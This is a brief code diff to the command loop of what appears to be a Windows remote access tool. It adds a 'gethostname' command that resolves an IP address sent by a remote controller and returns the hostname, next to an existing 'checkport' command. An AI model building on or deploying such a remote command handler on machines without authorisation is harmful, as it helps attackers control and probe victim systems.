@@ -82,6 +82,16 @@ void fhdawn_main(void)
 
         }
 
+        else if (strcmp(recvbuf, "gethostname") == 0){
+            memset(recvbuf, '\0', BUFFER);
+            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+            {
+                connected = FALSE;
+            }
+            sockprintf(sockfd, "%s - %s", recvbuf, IP2Host(recvbuf));
+        }
+
         else if(strcmp(recvbuf, "checkport") == 0)
         {
             memset(recvbuf, '\0', BUFFER);
